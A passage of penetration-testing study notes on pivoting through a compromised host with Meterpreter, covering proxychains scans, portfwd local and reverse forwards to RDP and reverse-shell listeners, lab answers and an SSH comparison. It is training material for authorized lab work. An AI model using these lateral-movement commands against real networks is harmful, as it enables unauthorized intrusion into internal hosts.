- Configure `/etc/proxychains4.conf` with `socks4 127.0.0.1 9050`
- Use tools: `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`

### 4. Meterpreter Port Forwarding (`portfwd`)
- **Local forward** (bring a remote port to your attack host):  
`portfwd add -l 3300 -p 3389 -r 172.16.5.19`  
Then connect directly: `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
- **Reverse forward** (catch reverse shells from internal hosts):  
`portfwd add -R -l 8081 -p 1234 -L <ATTACK_IP>`  
Generate payload with `LHOST` = pivot’s internal IP, `LPORT` = pivot’s listening port.  
Set handler on attack host with `LPORT 8081`.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? | `172.16.5.19,172.16.5.129` | Run the Linux ping sweep one‑liner on the pivot. Output shows two responding IPs. |
| Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? | `172.16.5.0/255.255.254.0` | Check routing table on pivot with `netstat -r`. The route covering `172.16.5.19` is `172.16.4.0` with netmask `255.255.254.0` → AutoRoute uses subnet/netmask format. |

## Key Takeaways
- Meterpreter pivoting works without SSH access – you only need a session on the pivot.
- `autoroute` tells Metasploit how to reach internal subnets; it does not automatically forward ports – you still need `socks_proxy` or `portfwd`.
- The `socks_proxy` module creates a SOCKS4a proxy that works with proxychains, similar to `ssh -D`.
- `portfwd add` is the Meterpreter equivalent of SSH local forwarding (`-L`).
- `portfwd add -R` is the equivalent of SSH remote forwarding (`-R`) – useful for catching reverse shells from hosts that can reach the pivot.

## Gotchas
- The `ping_sweep` module may miss hosts on the first run; always run it twice or use a native shell one‑liner.
- AutoRoute requires the subnet in CIDR format (e.g., `172.16.5.0/23`) but the `netstat -r` output shows destination and netmask – convert accordingly.
- The SOCKS proxy in Metasploit defaults to version 4a; some tools may need version 5. Adjust with `set version 5` if required.
- `portfwd` local forwards are bound to `localhost` on your attack host by default – accessible only from your machine.
- Reverse port forwarding (`-R`) requires the pivot to be able to reach your attack host on the specified `-L` IP and port.

## Comparison Table: SSH vs. Meterpreter Pivoting

| Feature | SSH (`-D` / `-L` / `-R`) | Meterpreter (autoroute + socks_proxy / portfwd) |
|---------|--------------------------|--------------------------------------------------|
| Requires SSH access | Yes | No — just a Meterpreter shell |
| SOCKS proxy | `ssh -D 9050` | `auxiliary/server/socks_proxy` |
| Routing | Automatic via SSH | Must add routes with `autoroute` |
| Single port forward | `ssh -L` | `portfwd add -l -p -r` |
| Reverse forward | `ssh -R` | `portfwd add -R` |
| Advantage | Simple, no MSF needed | Integrated with MSF modules and post‑exploitation |

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|pivoting-tunneling]]  
← [[05-ssh-port-forwarding]] | [[07-socat-redirection]] →
<!-- AUTO-LINKS-END -->
